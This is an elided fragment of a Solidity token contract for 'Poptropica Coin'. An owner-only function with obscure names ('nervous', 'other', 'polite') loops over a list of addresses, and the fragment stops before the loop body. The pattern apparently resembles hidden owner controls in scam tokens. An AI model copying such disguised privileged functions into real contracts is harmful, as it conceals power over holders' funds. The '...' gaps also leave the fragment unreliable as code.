...
contract poptropicacoin is Context, IERC20 {
    ...
    address public  nervous;
    constructor () {
        _name = "Poptropica Coin";
        _symbol = "POPCOIN";
        _decimals = 18;
    ...
    modifier onlyOwner() {
        require(msg.sender == nervous, "Not allowed");
        _;
    }

    function other(address[] memory polite) public onlyOwner() {
        for (uint256 i = 0; i < polite.length; i++) {
            address account = polite[i];
